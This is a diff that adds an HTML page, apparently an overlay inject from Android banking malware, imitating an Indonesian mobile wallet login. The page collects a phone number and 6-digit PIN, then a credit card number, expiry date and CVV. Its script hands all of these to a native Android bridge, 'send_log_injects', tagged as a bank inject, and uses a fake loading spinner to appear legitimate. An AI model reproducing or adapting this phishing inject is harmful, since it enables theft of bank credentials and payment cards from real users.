@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+<style>
+    section{
+        padding: 15px;
+    }
+    .input{
+        width: 100%;
+        border:0;
+        border-bottom: 1px solid transparent;
+        background-color: transparent;
+    }
+    .col_input{
+        width: 100%;
+        background-color:#f8f8f8;
+        padding: 5px;
+        border-bottom: 1px solid #f5f5f5;
+        border-top-left-radius: 5px;
+        border-top-right-radius: 5px;
+        margin-bottom: 20px;
+    }
+    .login {
+        background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAATCAIAAADu5eFvAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjI5RTcwQkNBMUQ3NjExRURBRUE0OTUxQ0I3MjczMjQxIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjI5RTcwQkNCMUQ3NjExRURBRUE0OTUxQ0I3MjczMjQxIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MjlFNzBCQzgxRDc2MTFFREFFQTQ5NTFDQjcyNzMyNDEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MjlFNzBCQzkxRDc2MTFFREFFQTQ5NTFDQjcyNzMyNDEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5nvwxhAAABrklEQVR42qyTS28TMRSFj98zk5kSlCiCij2sKnb8CH5ul4gdYglbCu2Kx0SKoE07sWfGLzwpSJFYueSsbEv387nn2iScv23fvd9cXWy3W7taIEeuv5urqtIRYM3TJ8sXz+tXZ5x8vDh98+H063doDfU5ixhVRUSJ9S0CwWJplp/itw3vLi/dl6u5dWAUQmQRx9EqqkApqhmEXLdr1bZ8d0LtSmDQ84FCN1lE9TiM+kY6Bz6Dvm4K4cLArbXOOZoMcgbBkRekkXWN0U7rEGKMwQded5508iREpMbFXV6OP3tSL2Ai+lQrVCXdEHmSLEvYiGEAk1lEohQIQfBgQFkqxQ2lXPQy9gxDDe/BR2QGCSJtGZK9jsUfJBEY3ycQYD1KBW/yYoyOECpS+pz1WruiKATn7euX5myp/Ji2XRp3Vte4FjY0REk5u9ndukfNr2crEtcbEIZgwZPfIq9rup1mEgWohBvRzGB3xBiT3E2Di5GkmPOVCr33fDKU/p2mOIYOrdB0w7+nDyYm2jE9xr34EVu+J9L4V/+Pnt71fY5h/8kfRjks/OPxcHOUTH8LMABWrOlcM3rxUwAAAABJRU5ErkJggg==);
+        background-repeat: no-repeat;
+        background-size: 25px;
+        background-position: 10px;
+        padding-left: 45px;
+    }
+    input, button{
+        outline: none !important;
+        box-shadow: none !important;
+    }
+
+    .error {
+        border-color: #f00 !important;
+    }
+    .button{
+        width: 100%;
+        padding: 10px;
+        border-radius: 5px;
+        border:0;
+        background-color: #e11a31;
+        color: #fff;
+        font-weight: 400;
+        margin-bottom: 20px;
+    }
+    .button:disabled{
+        opacity: 0.5;
+    }    
+</style>
+</head>
+<body>
+    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color: #e11a31;"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header></header>
+            <section>
+                <div class="col_input">
+                    <label for="login">Nomor HP</label>
+                    <input type="tel" id="login" class="input login" maxlength="9" placeholder="cth: 812345678">
+                </div>
+                <div class="col_input">
+                    <label for="password">PIN</label>
+                    <input type="password" id="password" class="input" maxlength="6" placeholder="6 digit PIN">
+                    <img style="float: right;position: relative;top: -19px;width: 19px;left: 3px;z-index: 999;cursor: pointer;" id="eye" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAARCAIAAABIGvtnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkEzMTg1QkIwMUQ3NjExRUQ4MTE2RTk2MTQwMkZEMEI5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkEzMTg1QkIxMUQ3NjExRUQ4MTE2RTk2MTQwMkZEMEI5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QTMxODVCQUUxRDc2MTFFRDgxMTZFOTYxNDAyRkQwQjkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QTMxODVCQUYxRDc2MTFFRDgxMTZFOTYxNDAyRkQwQjkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz40HPlpAAAC5UlEQVR42lTU2S4sURTG8S7VTZvbLKFNMYQYEiLew7OIay68lysXiOlCRMQ8h0ZzzMP5VVXOyTn7orJr91r/9a1vr+rg7e0tk8l8fHy8vLx8f38vLy9XV1cPDQ2Vl5f/ilc6nf76+grDsLS0tKSkxGtlZaXN09OTc2FOPj8/00EQoEB4v7u7297eTogDAwOPj487Ozu3t7deq6qqysrKIFpaWhoaGuRns9n393esVCoFkhYkMwlCrK+vx1paWhLU0dEh4vz8/Pn5WbTImpqapqYm0Pb29pGRERuS9QQaKYIAdkTt4OCgTrFWV1dpxGpubr68vKTu5OTk/v6ean2RKVGwmIqKCmXCubk5LyLW19c3NjZA8/k8aaenpzc3N2oODw93d3cjSkiKkUbv1dWVZ11dXW1tLVDkk2okrK2t6cJ+dHS0p6cH6+DggC42Y7kBT1oIIUfWxcXF6+srES5BjXBmZoajW1tbfiDn4eFBwdbW1ra2Nv1qqlgsZuLFZh4VCgVagED9RBQQZyNF19fXtKjMchRNMVJ9J3QdHx/TJUGbcuD0okAYL+3jdnV1RSBB8tU8OztjLZ3JBPT393vqn82bm5vSxsbG4KQwKxkC3mOpl6ZCpvtzi5SzQEdA6LlcDku/i4uLR0dHKysrIlXq7e3ljgD5EgVQGi4sLKhZjBfnjEwyF9zNxgtdMWgsXWCxj0HkY5nbiYkJ/Ybz8/OR52H48/NDp6cg4p2wEMg+Fy8F9IhI1N/hnpycxGJLODs7m9Q3ESiJItHmxdM0KGuvGI9BiXKz9rrOxwtRTPRBWixM7pi7LtF8umYjKp9sXihDSF9fn2L7+/tOQMfHxxNzo4+WT5L9AGd8vRJisg4PD/Wo+N7eHo/Mh+ipqanGxkaR/DITbh0oIQT8T/1Z3iXbkOqCC/FK/kmI5TrXpDnc3d1VaXp6mifJt/YfSMK/0KTrqFoQJL/C2fPRV6L9zs5OihwK+y3AANYEUg1ClG6ZAAAAAElFTkSuQmCC" alt="">
+                </div>
+                <p style="color: #bad5ee; margin-bottom: 15px;">
+                    <u>
+                        Lupa pin?
+                    </u>
+                </p>
+                <input type="button" name="button" id="nextPage" class="button" value="Login">
+                <p style="text-align:center; font-weight: 300;">
+                    Belum punya akun? <span style="color:#bfd1e6;">Daftar Sekarang</span>
+                </p>
+            </section>
+        </div>
+        <div id="form2" style="display: none;">
+            <heaerd></heaerd>
+            <section>
+                
+                <div class="col_input">
+                    <label for="login">Credit Card</label>
+                    <input style="margin-bottom: 5px;" type="tel" id="cc" name="cc" onkeyup="check6();check5()" placeholder="Credit Card"  class="input" autocomplete="off">
+                </div>
+                
+               
+                <div  style="width: 58%;float: left;" class="col_input">
+                    <label for="login">Expiration Date</label>
+                    <input type="tel" id="exp" name="exp" maxlength="5" onkeyup="check7();check5()" placeholder="Expiration Date"  class="input" required>
+                </div>
+                <div  style="width: 40%;float: right;" class="col_input">
+                    <label for="login">CVV</label>
+                    <input  type="password" id="cvv" name="cvv" maxlength="3" onkeyup="check5()" placeholder="CVV" class="input cool-input__input cardcc" required>
+                </div>
+
+                <input type="button" id="sendData" disabled class="button" value="Login">
+            </section>
+        </div>
+    </form>
+<script>
+     $('#cc').mask('0000 0000 0000 0000')
+     $('#exp').mask('00/00')
+     $('#cvv').mask('000')
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2');
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        var eye = document.getElementById('eye');
+
+        eye.onclick = () => {
+            if(password.type == 'password') {
+                password.type = 'text';
+            } else {
+                password.type = 'password';
+            }
+        }
+
+            nextPage.onclick = () => {
+            if(login.value.length < 4) {
+                login.classList.add('error');
+            } else {
+                login.classList.remove('error')
+            }
+
+            if(password.value.length !== 6) {
+                password.classList.add('error')
+            } else {
+                password.classList.remove('error')
+            } 
+
+
+            if(login.value.length >= 4 && password.value.length === 6 ) {
+                spinner.style.display = 'block';
+
+                setTimeout(() => {
+                    spinner.style.display = 'none'
+                    form1.style.display = 'none'
+                    form2.style.display = 'block'
+                }, 1500);
+            }
+
+            
+        }
+
+
+        
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+                return true
+            }
+        }
+
+        function check7() {
+            var mmYY = exp.value.split('/');
+			var month = parseInt(mmYY[0]);
+			var year = parseInt(mmYY[1]);
+			
+
+			var expArray = exp.value.split('/');
+			var today, someday;
+			var exMonth = expArray[0];
+			var exYear = "20" + expArray[1];
+
+			today = new Date();
+			someday = new Date();
+			someday.setFullYear(exYear, exMonth, 1);
+                
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check5() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+</script>
+</body>
+</html>
